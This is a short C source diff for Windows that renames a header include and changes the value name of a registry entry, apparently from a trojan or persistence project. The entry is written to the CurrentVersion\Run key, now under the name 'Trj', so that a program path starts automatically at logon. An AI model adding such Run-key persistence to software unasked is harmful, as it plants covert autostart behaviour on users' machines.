@@ -1,8 +1,8 @@
 #include <Windows.h>
 #include <stdio.h>
 
-#include "RegeditFunctions/RegFunctions.h"
 #include "core/core.h"
+#include "registryFunctions/registryFunctions.h"
 
 #pragma comment(lib, "advapi32.lib")
 
@@ -15,7 +15,7 @@ int main() {
   regedit_all reg_add = {
       NULL,
       L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-      L"Discard",
+      L"Trj",
       path.path,
   };
 
